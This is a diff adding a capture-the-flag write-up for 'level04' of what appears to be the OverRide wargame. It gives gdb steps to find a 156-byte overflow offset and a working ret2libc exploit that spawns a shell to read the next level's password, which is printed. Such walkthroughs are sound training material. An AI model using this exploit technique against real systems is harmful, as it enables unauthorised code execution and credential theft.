@@ -1,0 +1,44 @@
+
+in this level as we have a main that obviously has a big gets dancing there 
+waiting for us to use it.. the trick was just to follow the child process in gdb
+so we know the offset of the overflow .. as db by default doesn't track it
+
+so let's first set gdb to follow fork mode:
+---------------------------------
+(gdb) set follow-fork-mode child
+---------------------------------
+
+now let's just simply get the offset.. that we already fouund at 157:
+---------------------------------
+(gdb) run <<< $(python -c "print 'A' * 157")
+Starting program: /home/users/level04/level04 <<< $(python -c "print 'A' * 157")
+[New process 1670]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1670]
+0xf7e40041 in ?? () from /lib32/libc.so.6
+---------------------------------
+
+we got the offset now let's use again ret2libc (BOOOY savioooor)
+ 
+let's get the system address first and the "/bin/sh":
+---------------------------------
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+---------------------------------
+
+now let's get our flag with the usual pyhon script:
+---------------------------------
+level04@OverRide:~$ (python -c "print 'A' * 156 + '\xf7\xe6\xae\xd0'[::-1] + 'AAAA' + '\xf7\xf8\x97\xec'[::-1]"; cat) | ./level04
+Give me some shellcode, k
+ls
+ls: cannot open directory .: Permission denied
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+---------------------------------
